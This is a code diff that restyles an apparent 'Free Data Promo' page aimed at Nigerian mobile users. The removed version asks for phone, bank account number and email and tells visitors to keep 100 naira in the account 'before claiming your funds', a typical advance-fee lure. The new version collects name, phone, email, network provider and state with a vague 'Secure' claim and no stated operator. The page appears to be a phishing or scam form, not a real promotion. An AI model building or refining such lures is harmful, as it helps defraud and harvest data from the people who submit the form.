@@ -1,122 +1,629 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Free Data Promo</title>
-    <style>
-        body {
-            background-color: #a40000;
-            font-family: Arial, sans-serif;
-            color: white;
-            text-align: center;
-            margin: 0;
-            padding: 0;
-        }
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-        .top-bar {
-            background-color: #ffffff;
-            padding: 15px;
-            font-weight: bold;
-            text-align: center;
-        }
+  <title>Free Data Promo</title>
 
-        .menu-button {
-            background: #a40000;
-            color: #ffffff;
-            border: none;
-            padding: 10px;
-            font-size: 16px;
-            cursor: pointer;
-            border-radius: 5px;
-        }
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
 
-        .note {
-            color: #ffffff;
-            font-size: 14px;
-            margin-top: 5px;
-            padding: 10px;
-        }
+    body {
+      font-family: Arial, Helvetica, sans-serif;
+      background: #111111;
+      color: #ffffff;
+      min-height: 100vh;
+    }
 
-        .logo-wrap {
-            margin-top: 20px;
-        }
+    /* HEADER */
+    .header {
+      height: 64px;
+      background: #181818;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 18px;
+      border-bottom: 1px solid #292929;
+      position: sticky;
+      top: 0;
+      z-index: 10;
+    }
 
-        .logo-wrap img {
-            width: 120px;
-            max-width: 90%;
-            height: auto;
-        }
+    .brand {
+      font-size: 21px;
+      font-weight: 800;
+      letter-spacing: -0.5px;
+    }
 
-        .container {
-            background-color: #ffffff;
-            padding: 20px;
-            border-radius: 10px;
-            width: 80%;
-            max-width: 400px;
-            margin: 20px auto;
-            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.25);
-        }
+    .brand span {
+      color: #e50914;
+    }
 
-        input {
-            width: 90%;
-            padding: 12px;
-            margin: 10px 0;
-            border: 2px solid #a40000;
-            border-radius: 20px;
-            background-color: white;
-            color: black;
-            font-size: 16px;
-            outline: none;
-        }
+    .menu-btn {
+      width: 42px;
+      height: 38px;
+      border: none;
+      border-radius: 7px;
+      background: #e50914;
+      color: white;
+      font-size: 20px;
+      cursor: pointer;
+    }
 
-        button {
-            background-color: #a40000;
-            color: #ffffff;
-            border: none;
-            padding: 12px;
-            border-radius: 5px;
-            cursor: pointer;
-            font-size: 16px;
-            width: 95%;
-            margin-top: 10px;
-        }
+    /* MAIN */
+    .container {
+      width: 100%;
+      max-width: 520px;
+      margin: 0 auto;
+      padding: 30px 18px 45px;
+    }
 
-        button:hover {
-            background-color: #830000;
-        }
+    /* BADGE */
+    .badge {
+      display: inline-block;
+      background: rgba(229, 9, 20, 0.12);
+      color: #ff3b45;
+      border: 1px solid rgba(229, 9, 20, 0.35);
+      padding: 7px 12px;
+      border-radius: 20px;
+      font-size: 12px;
+      font-weight: 700;
+      margin-bottom: 15px;
+    }
 
-        .footer {
-            margin: 20px 0;
-            color: #ffffff;
-            font-size: 13px;
-        }
-    </style>
+    /* HERO */
+    .hero {
+      text-align: center;
+      margin-bottom: 25px;
+    }
+
+    .hero h1 {
+      font-size: 34px;
+      line-height: 1.1;
+      font-weight: 900;
+      margin-bottom: 12px;
+      letter-spacing: -1px;
+    }
+
+    .hero h1 span {
+      color: #e50914;
+    }
+
+    .hero p {
+      color: #a8a8a8;
+      font-size: 15px;
+      line-height: 1.6;
+    }
+
+    /* LOGO */
+    .logo-wrap {
+      background: #181818;
+      border: 1px solid #292929;
+      border-radius: 14px;
+      padding: 18px;
+      margin: 20px 0;
+      text-align: center;
+    }
+
+    .logo {
+      width: 100%;
+      max-width: 180px;
+      height: auto;
+      display: block;
+      margin: 0 auto;
+    }
+
+    /* NOTICE */
+    .notice {
+      background: #1c1c1c;
+      border-left: 4px solid #e50914;
+      border-radius: 8px;
+      padding: 15px;
+      margin-bottom: 22px;
+    }
+
+    .notice-title {
+      font-size: 14px;
+      font-weight: 800;
+      margin-bottom: 6px;
+    }
+
+    .notice-text {
+      color: #aaaaaa;
+      font-size: 13px;
+      line-height: 1.5;
+    }
+
+    /* FORM CARD */
+    .form-card {
+      background: #181818;
+      border: 1px solid #292929;
+      border-radius: 14px;
+      padding: 20px;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.25);
+    }
+
+    .form-title {
+      font-size: 20px;
+      font-weight: 800;
+      margin-bottom: 5px;
+    }
+
+    .form-subtitle {
+      color: #999999;
+      font-size: 13px;
+      margin-bottom: 20px;
+    }
+
+    .field {
+      margin-bottom: 16px;
+    }
+
+    .field label {
+      display: block;
+      font-size: 13px;
+      font-weight: 700;
+      margin-bottom: 7px;
+      color: #dddddd;
+    }
+
+    .field input {
+      width: 100%;
+      height: 50px;
+      padding: 0 14px;
+      border: 1px solid #333333;
+      border-radius: 8px;
+      background: #111111;
+      color: #ffffff;
+      font-size: 15px;
+      outline: none;
+      transition: 0.2s ease;
+    }
+
+    .field input::placeholder {
+      color: #666666;
+    }
+
+    .field input:focus {
+      border-color: #e50914;
+      box-shadow: 0 0 0 2px rgba(229, 9, 20, 0.12);
+    }
+
+    /* SUBMIT BUTTON */
+    .submit-btn {
+      width: 100%;
+      height: 52px;
+      border: none;
+      border-radius: 8px;
+      background: #e50914;
+      color: #ffffff;
+      font-size: 16px;
+      font-weight: 800;
+      cursor: pointer;
+      margin-top: 5px;
+      transition: 0.2s ease;
+    }
+
+    .submit-btn:hover {
+      background: #c90812;
+    }
+
+    .submit-btn:disabled {
+      opacity: 0.65;
+      cursor: not-allowed;
+    }
+
+    /* INFO CARDS */
+    .info-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 12px;
+      margin-top: 18px;
+    }
+
+    .info-card {
+      background: #181818;
+      border: 1px solid #292929;
+      border-radius: 10px;
+      padding: 15px;
+    }
+
+    .info-icon {
+      font-size: 20px;
+      margin-bottom: 8px;
+    }
+
+    .info-card h3 {
+      font-size: 14px;
+      margin-bottom: 5px;
+    }
+
+    .info-card p {
+      color: #888888;
+      font-size: 12px;
+      line-height: 1.5;
+    }
+
+    /* FOOTER */
+    .footer {
+      text-align: center;
+      color: #666666;
+      font-size: 12px;
+      margin-top: 30px;
+      line-height: 1.6;
+    }
+
+    /* ERROR */
+    .error-message {
+      display: none;
+      background: rgba(229, 9, 20, 0.1);
+      border: 1px solid rgba(229, 9, 20, 0.3);
+      color: #ff5c64;
+      border-radius: 8px;
+      padding: 12px;
+      font-size: 13px;
+      margin-bottom: 15px;
+    }
+
+    /* MOBILE */
+    @media (max-width: 400px) {
+      .hero h1 {
+        font-size: 29px;
+      }
+
+      .container {
+        padding-left: 14px;
+        padding-right: 14px;
+      }
+
+      .form-card {
+        padding: 16px;
+      }
+    }
+  </style>
 </head>
+
 <body>
 
-    <div class="top-bar">
-        <button class="menu-button">☰ MENU</button>
+  <!-- HEADER -->
+  <header class="header">
+    <div class="brand">
+      Free<span>Data</span>
     </div>
 
-    <div class="note">
-        NOTE: MAKE SURE YOUR ACCOUNT HAS A BALANCE OF 100 NAIRA BEFORE CLAIMING YOUR FUNDS
-    </div>
+    <button class="menu-btn" type="button" aria-label="Menu">
+      ☰
+    </button>
+  </header>
 
+
+  <!-- MAIN -->
+  <main class="container">
+
+    <!-- HERO -->
+    <section class="hero">
+
+      <div class="badge">
+        🔥 SPECIAL PROMO
+      </div>
+
+      <h1>
+        Get Your <span>Free Data</span>
+      </h1>
+
+      <p>
+        Fill in the form below with your information
+        to participate in the free data promo.
+      </p>
+
+    </section>
+
+
+    <!-- LOGO -->
     <div class="logo-wrap">
-        <img src="logo.png" alt="Your Logo">
+
+      <!-- Replace the URL below with your actual logo link -->
+      <img
+        src="https://i.imgur.com/VhaROCK.png"
+        alt="Free Data Logo"
+        class="logo"
+      >
+
     </div>
 
-    <div class="container">
-        <form name="promoForm" method="POST" data-netlify="true" action="success.html">
-            <input type="text" name="phone" placeholder="Phone Number" required>
-            <input type="text" name="account_number" placeholder="Account Number used to deposit" required>
-            <input type="email" name="email" placeholder="Email" required>
-            <button type="submit">Claim funds</button>
-        </form>
+
+    <!-- NOTICE -->
+    <div class="notice">
+
+      <div class="notice-title">
+        📢 Important Notice
+      </div>
+
+      <div class="notice-text">
+        Make sure the information you provide is correct
+        before submitting the form.
+      </div>
+
     </div>
 
-    <div class="footer">© 2026 Free Data. All rights reserved.</div>
+
+    <!-- FORM -->
+    <section class="form-card">
+
+      <div class="form-title">
+        Enter Your Details
+      </div>
+
+      <div class="form-subtitle">
+        Complete all the fields below.
+      </div>
+
+      <div
+        id="errorMessage"
+        class="error-message"
+      ></div>
+
+
+      <form id="promoForm">
+
+        <!-- FULL NAME -->
+        <div class="field">
+
+          <label for="name">
+            Full Name
+          </label>
+
+          <input
+            type="text"
+            id="name"
+            name="name"
+            placeholder="Enter your full name"
+            autocomplete="name"
+            required
+          >
+
+        </div>
+
+
+        <!-- PHONE -->
+        <div class="field">
+
+          <label for="phone">
+            Phone Number
+          </label>
+
+          <input
+            type="tel"
+            id="phone"
+            name="phone"
+            placeholder="Enter your phone number"
+            autocomplete="tel"
+            required
+          >
+
+        </div>
+
+
+        <!-- EMAIL -->
+        <div class="field">
+
+          <label for="email">
+            Email Address
+          </label>
+
+          <input
+            type="email"
+            id="email"
+            name="email"
+            placeholder="Enter your email address"
+            autocomplete="email"
+            required
+          >
+
+        </div>
+
+
+        <!-- NETWORK -->
+        <div class="field">
+
+          <label for="network">
+            Network Provider
+          </label>
+
+          <input
+            type="text"
+            id="network"
+            name="network"
+            placeholder="e.g. MTN, Airtel, Glo, 9mobile"
+            required
+          >
+
+        </div>
+
+
+        <!-- STATE -->
+        <div class="field">
+
+          <label for="state">
+            State
+          </label>
+
+          <input
+            type="text"
+            id="state"
+            name="state"
+            placeholder="Enter your state"
+            autocomplete="address-level1"
+            required
+          >
+
+        </div>
+
+
+        <!-- SUBMIT -->
+        <button
+          type="submit"
+          class="submit-btn"
+          id="submitBtn"
+        >
+          Submit Application
+        </button>
+
+      </form>
+
+    </section>
+
+
+    <!-- INFO -->
+    <div class="info-grid">
+
+      <div class="info-card">
+
+        <div class="info-icon">
+          🔒
+        </div>
+
+        <h3>
+          Secure
+        </h3>
+
+        <p>
+          Your submitted information is
+          handled through the form system.
+        </p>
+
+      </div>
+
+
+      <div class="info-card">
+
+        <div class="info-icon">
+          ⚡
+        </div>
+
+        <h3>
+          Fast
+        </h3>
+
+        <p>
+          Submit your details quickly
+          using the simple form above.
+        </p>
+
+      </div>
+
+    </div>
+
+
+    <!-- FOOTER -->
+    <footer class="footer">
+
+      © 2026 Free Data Promo<br>
+      Please provide accurate information.
+
+    </footer>
+
+  </main>
+
+
+  <!-- JAVASCRIPT -->
+  <script>
+
+    const form = document.getElementById("promoForm");
+    const submitBtn = document.getElementById("submitBtn");
+    const errorMessage = document.getElementById("errorMessage");
+
+
+    form.addEventListener("submit", async function(event) {
+
+      event.preventDefault();
+
+      errorMessage.style.display = "none";
+      errorMessage.textContent = "";
+
+      submitBtn.disabled = true;
+      submitBtn.textContent = "Submitting...";
+
+
+      const name =
+        document.getElementById("name").value.trim();
+
+      const phone =
+        document.getElementById("phone").value.trim();
+
+      const email =
+        document.getElementById("email").value.trim();
+
+      const network =
+        document.getElementById("network").value.trim();
+
+      const state =
+        document.getElementById("state").value.trim();
+
+
+      try {
+
+        const response = await fetch("/api/submit", {
+
+          method: "POST",
+
+          headers: {
+            "Content-Type": "application/json"
+          },
+
+          body: JSON.stringify({
+
+            name: name,
+            phone: phone,
+            email: email,
+            network: network,
+            state: state
+
+          })
+
+        });
+
+
+        const result = await response.json();
+
+
+        if (!response.ok) {
+
+          throw new Error(
+            result.error ||
+            "Something went wrong. Please try again."
+          );
+
+        }
+
+
+        // Successful submission
+        window.location.href = "/success.html";
+
+
+      } catch (error) {
+
+        console.error(error);
+
+        errorMessage.textContent =
+          error.message ||
+          "Unable to submit the form. Please try again.";
+
+        errorMessage.style.display = "block";
+
+        submitBtn.disabled = false;
+        submitBtn.textContent = "Submit Application";
+
+      }
+
+    });
+
+  </script>
 
 </body>
 </html>
